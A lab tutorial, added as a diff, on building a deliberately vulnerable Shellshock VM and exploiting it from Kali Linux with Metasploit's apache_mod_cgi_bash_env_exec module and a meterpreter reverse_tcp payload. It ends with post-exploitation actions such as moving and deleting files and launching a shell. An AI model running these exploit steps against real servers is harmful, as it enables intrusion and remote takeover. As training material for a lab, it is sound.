@@ -1,0 +1,79 @@
+To exploit vulnerability in a webserver using Metasploit, perform the following steps:
+1. Open a web browser on the Windows 8.1 machine and type www.google.com in the URL. In the Google search bar, type shellshock vm and press Enter. It will give you a
+list of results. Open the result shown in Figure
+
+2. Scroll down the Pentesterlab page and click on here as shown in Figure, to
+download the ISO of a VM with Shellshock vulnerability.
+
+3. Open the VMWare Workstation Pro after the VM is downloaded and click on
+Create a New Virtual Machine as shown in Figure
+
+It will start the New Virtual Machine Wizard as shown in Figure.
+Select the Typical (recommended) radio button and click on Next, as shown in Figure
+
+4. It will open the Guest Operating System Installation window as shown in Figure
+
+5. Click on Browse and navigate to the ISO you have downloaded in Step 2. Click
+on Next as shown in Figure
+
+It will open a Select a guest operating system window as shown in Figure
+6. Leave the options to default and click Next as shown in Figure
+
+It will open the Name the virtual machine window as shown in Figure.
+Type shellshock in the Virtual Machine name: text box and click on Next as shown in
+Figure
+
+It will open a Specify Disk Capacity window as shown in Figure
+7. Leave the options to default and click on Next as shown in Figure
+
+8. Review the settings and click on Finish, as shown in Figure
+
+9. It will start installing the virtual machine. When the virtual machine will be
+completely installed, it will show you a command-line window as shown in Figure
+
+10. Type the command ifconfig and press Enter to view the IP address configuration
+of the machine, as shown in Figure
+
+11. Switch and login to the Kali Linux VM. Open a web browser as shown in Figure
+
+12. Type http://192.168.0.109 and press Enter to check if the webs server is up and
+running, as shown in Figure. Here, 192.168.0.109 is the IP address of the shellshock VM.
+
+13. Type http://192.168.0.109/cgi-bin/status and press Enter to check if there is a
+shellshock vulnerability in the webserver, as shown in Figure. If it shows an output as
+shown in Figure, then there is a shellshock vulnerability
+
+14. Open the Metasploit tool. It will open a window, as shown in Figure
+
+15. Type the command ‘use exploit/multi/http/apache_mod_cgi_bash_env_exec’
+and press Enter to select the exploit, as shown in Figure
+
+16. Set the lhost using the command ‘set LHOST 192.168.0.133’ and press Enter. The
+IP of the Kali Linux is 192.168.0.133, as shown in Figure
+
+17. Set the rhost using the command ‘set RHOST 192.168.0.109’ and press Enter. The
+IP of the Shellshock VM is 192.168.0.109, as shown in Figure
+
+18. Set the TargetURI using the command ‘set TARGETURI /cgi-bin/status’ and
+press Enter, as shown in Figure
+
+19. Set the payload using the command ‘set payload linux/x86/meterpreter/
+reverse_tcp’, and press Enter, as shown in Figure
+
+20. Type ‘exploit’ and press Enter to run the exploit in the background, as shown in
+Figure 102. It will open a Meterpreter session
+
+From this opened meterpreter session, you can perform the following tasks:
+View the files and directories located in the machine,
+Delete, upload and download files from the machine,
+Execute applications remotely,
+List the processes,
+Launch a shell,
+Reboot or shutdown the machine, etc.
+
+21. Type help and press Enter to view the help on the meterpreter commands, as
+shown in Figure
+
+22. Type arp and press Enter to view the ARP cache, as shown in Figure
+
+23. Type ipconfig and press Enter to view the IP configuration, as shown in Figure
